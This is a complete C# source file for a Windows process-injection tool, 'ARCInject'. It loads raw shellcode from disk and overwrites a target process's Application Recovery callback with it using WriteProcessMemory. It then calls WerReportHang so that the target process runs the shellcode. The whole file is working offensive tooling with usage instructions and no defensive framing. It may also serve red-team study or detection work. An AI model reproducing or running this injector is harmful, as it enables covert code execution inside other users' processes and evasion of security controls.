using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace ARCInject
{
	class Program
	{
		static void Main(string[] args)
		{
			//Need to specify a path to the payload.
			if (args.Length != 2)
			{
				Console.WriteLine("\n[*] Usage: ARCInject.exe <C:\\Path\\To\\Shellcode.bin> <pid>\n");
				Environment.Exit(0);
			}

			//Make sure the specified file exists.
			if (!File.Exists(args[0]))
			{
				Console.WriteLine("\n[!] File not found: {0}\n", args[0]);
				Environment.Exit(0);
			}

			string payloadFile = args[0];

			int processPid = 0; //pid of process to query for Recovery callbacks. 
			if (!Int32.TryParse(args[1], out processPid))
			{
				Console.WriteLine("\n[!] Target PID could not be set\n");
				Environment.Exit(0);
			}

			byte[] payload = File.ReadAllBytes(payloadFile); //Convert the contents of a file of raw shellcode to a byte array

			Process targetProcessDetails = new Process();
			IntPtr registeredCallback = IntPtr.Zero;

			//Identify a target process. This returns the Process details and the address of the recovery callback.  
			bool ret = FindRegisteredCallbacks(processPid, out targetProcessDetails, out registeredCallback);
			if (!ret)
			{
				Console.WriteLine("[!] No recovery callback found. Exiting...");
				Environment.Exit(0);
			}

			//Make sure we have the necessary data to continue.
			if (targetProcessDetails == null || registeredCallback == IntPtr.Zero)
			{
				Console.WriteLine("[!] Missing important process information. Exiting...");
				Environment.Exit(0);
			}

			//Use WriteProcessMemory to write the payload to the target process's registered callback address.
			IntPtr numWritten = IntPtr.Zero;
			ret = WriteProcessMemory(targetProcessDetails.Handle, registeredCallback, payload, payload.Length, out numWritten);
			if (!ret)
			{
				Console.WriteLine("[!] WriteProcessMemory: Failed to write payload. Exiting...");
				Environment.Exit(0);
			}

			Console.WriteLine("[+] WriteProcessMemory: Wrote payload to recovery callback address.");

			//Attempt to send a report which will lead to the execution of the shellcode written to the RecoveryCallback
			WerReportHang(targetProcessDetails.MainWindowHandle, IntPtr.Zero);
			Console.WriteLine("[+] WerReportHang called!");
		}
		static bool FindRegisteredCallbacks(int victim, out Process process, out IntPtr recoveryCallback)
		{
			Process proc = Process.GetProcessById(victim); //shouldn't include ".exe". (like "notepad" not "notepad.exe")

			IntPtr pRC = IntPtr.Zero; // A pointer to the recovery callback function.
			IntPtr ppvParam = IntPtr.Zero; // A pointer to the callback parameter.
			uint pdwPI = 0; // The recovery ping interval, in 100-nanosecond intervals.
			uint reserved = 0; // Reserved for future use.

			uint ret = GetApplicationRecoveryCallback(proc.Handle, out pRC, out ppvParam, out pdwPI, out reserved);
			if (ret == 0 && pRC != IntPtr.Zero)
			{
				Console.WriteLine("[+] ApplicationRecoveryCallback found for: {0}", proc.ProcessName);
				Console.WriteLine("[+] Registered Address: 0x{0:X}", pRC.ToInt64());
				process = proc;
				recoveryCallback = pRC;
				return true;
			}
			else
			{
				process = null;
				recoveryCallback = IntPtr.Zero;
				return false;
			}
		}

		// GetApplicationRecoveryCallback: https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getapplicationrecoverycallback
		[DllImport("kernel32.dll")]
		public static extern uint GetApplicationRecoveryCallback(IntPtr hProcess, out IntPtr pRecoveryCallback, out IntPtr ppvParameter, out uint pdwPingInterval, out uint pdwFlags);

		// WriteProcessMemory: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
		[DllImport("kernel32.dll")]
		public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

		// WerReportHang: https://docs.microsoft.com/en-us/windows/win32/api/errorrep/nf-errorrep-werreporthang
		[DllImport("Faultrep.dll")]
		public static extern uint WerReportHang(IntPtr hwndHungApp, IntPtr pwzHungApplicationName);
	}
}
